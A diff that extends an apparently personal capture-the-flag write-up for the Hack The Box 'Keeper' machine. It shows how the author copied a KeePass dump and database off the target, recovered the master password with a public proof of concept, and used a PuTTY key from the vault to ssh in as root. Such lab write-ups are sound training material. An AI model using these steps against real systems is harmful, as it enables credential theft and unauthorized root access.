@@ -72,7 +72,7 @@ Soon as you login with the credentials, you're in the home directory: `cat user.
 ## Privilege Escalation
 This is what I think makes this box actually easy - inside the home directory. You're given two KeePass files: `KeePassDumpFull.dmp` and `passcodes.kdbx`
 
-Fortunately, I'm actually familiar with KeePass from a previous job.
+Fortunately, I'm actually familiar with KeePass from a previous job. KeePass is a password manager. So I knew the kdbx file is an encrypted file containing a root password.
 
 ```bash
 `ls -lah
@@ -102,3 +102,82 @@ Special thanks to `vdohney` for their PoC and also mentioning a [python version]
 git clone https://github.com/matro7sh/keepass-dump-masterkey.git
 cd keepass-dump-masterkey/
 ```
+
+Now we need to get the dump file and password file back to my kali machine.We can use python to start an http server to curl the contents back to myself
+```
+#from the victim machine
+python3 -m http.server
+#this will open port 8000. Therefore I can easily curl it back
+
+#from host machine (inside the git clone repo)
+curl http://$TARGET:8000/passcodes.kdbx > passcodes.kdbx
+curl http://$TARGET:8000/KeePassDumpFull.dmp > dumpy.dmp
+```
+
+### Crack the Password Manager
+This is where `tmux`, my terminal in kali and trying to copy/paste failed me. When you run the python script against the dump file. you get output like this:
+```bash
+python3 poc.py ../dumpy.dmp
+2024-01-28 14:53:01,481 [.] [main] Opened ../dumpy.dmp
+Possible password: ●,dgr●d med fl●de
+Possible password: ●ldgr●d med fl●de
+Possible password: ●`dgr●d med fl●de
+Possible password: ●-dgr●d med fl●de
+Possible password: ●'dgr●d med fl●de
+Possible password: ●]dgr●d med fl●de
+Possible password: ●Adgr●d med fl●de
+Possible password: ●Idgr●d med fl●de
+Possible password: ●:dgr●d med fl●de
+Possible password: ●=dgr●d med fl●de
+Possible password: ●_dgr●d med fl●de
+Possible password: ●cdgr●d med fl●de
+Possible password: ●Mdgr●d med fl●de
+```
+
+Unfortunately, I was super close but ultimately had to reach out to a solution to realize how close I was.
+
+Thank you `Imène ALLOUCHE` for your [write-up](https://medium.com/@li_allouche/hack-the-box-keeper-writeup-56644dc6a55f)
+
+What we were essentially getting was the password `dgrød med flød`. However, I didn't have terminal configured to handle complex unicode characters. /facepalm. Sounds like I need to spend some time configuring my environment to be like my old Kali machine.
+
+If you google `dgrød med flød` you will quickly find the 2 characters and the password: `rødgrød med flød`
+
+### Installing KeePass and gaining Root
+```bash
+#on kali
+sudo apt install keepass2
+keepass2 passcodes.kdbx
+```
+
+Once you provide the master pass, `rødgrød med flød`
+
+
+## Getting the Root flag
+This is probably the main thing I learned from this challenge. The root password in this keystore didn't seem to work. However, inside there was a `Putty Private Key`. First, I didn't know this format existed. Second, I didn't know you could use this to generate a valid `id_rsa` file to ssh as root. Once again, thank you `Imène`.
+
+```bash
+# first we need puttygen
+sudo apt install putty-tools
+# Next we need to save the Private key inside KeePass. I named mine root.ppk
+puttygen root.ppk -O private-openssh -o id_rsa
+# now we have the private key in a format we can use for ssh
+ssh root@10.10.11.227 -i id_rsa
+cat root.txt
+```
+
+# Final Thoughts
+Really easy box I could have gotten without reading a write-up - I just made some noob mistakes with how my environment is configured. I plan to fix my copy/paste issues and get better unicode support in my terminal. Also, need to make it a habit to google default credentials before looking for a PoC.
+
+## The one thing I learned
+I never knew `ppk` files existed (try to avoid windows to be honest). So that was neat to learn. I recommend reading the article on ppk if curious. I felt like I learned something new.
+
+Definitely an easy, but I still enjoyed it. My main focus right now is staying consistent. Hopefully in a couple weeks, I can increase the difficult and get back to using some advanced tools/techniques. Or maybe, I'll try to write my own PoC from scratch (if the vuln is easy lol) - haven't decided yet.
+
+
+Resources
+---
+- [Article on ppk](https://www.baeldung.com/linux/ssh-key-types-convert-ppk)
+- [Write-up](https://medium.com/@li_allouche/hack-the-box-keeper-writeup-56644dc6a55f)
+- [KeePass PoC](https://github.com/vdohney/keepass-password-dumper?tab=readme-ov-file)
+- [Python PoC](https://github.com/matro7sh/keepass-dump-masterkey)
+
